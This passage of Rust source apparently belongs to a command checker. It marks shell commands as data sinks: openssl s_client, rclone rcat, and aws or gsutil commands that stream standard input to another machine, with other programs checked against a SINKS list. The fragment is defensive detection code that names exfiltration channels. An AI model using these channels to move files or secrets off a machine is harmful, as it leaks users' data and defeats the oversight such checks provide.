        "openssl" => args.iter().any(|arg| arg.known() == Some("s_client")),
        "rclone" => operands(args, &[]).first().and_then(|arg| arg.known()) == Some("rcat"),
        "aws" | "gsutil" => {
            args.iter().any(|arg| arg.known() == Some("-"))
                && operands(args, &[])
                    .iter()
                    .any(|arg| to_other_machine(arg, false))
        }
        _ => SINKS.contains(&key),
    }
}
